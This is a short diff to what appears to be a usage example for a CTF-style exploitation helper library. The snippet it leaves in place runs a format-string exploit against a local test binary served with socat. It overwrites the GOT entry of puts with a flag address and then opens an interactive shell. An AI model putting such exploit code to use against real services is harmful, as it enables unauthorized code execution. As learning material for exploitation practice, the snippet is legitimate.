@@ -1,7 +1,3 @@
-# Usage of No___Op
-
-## fsb.py
-```
 from No___Op import *
 
 #socat TCP-LISTEN:17171,reuseaddr,fork EXEC:./test
@@ -18,4 +14,3 @@ fsb.rewrite(got_puts, addr_flag)
 
 tube.sendline(fsb.get())
 tube.shell()
-```
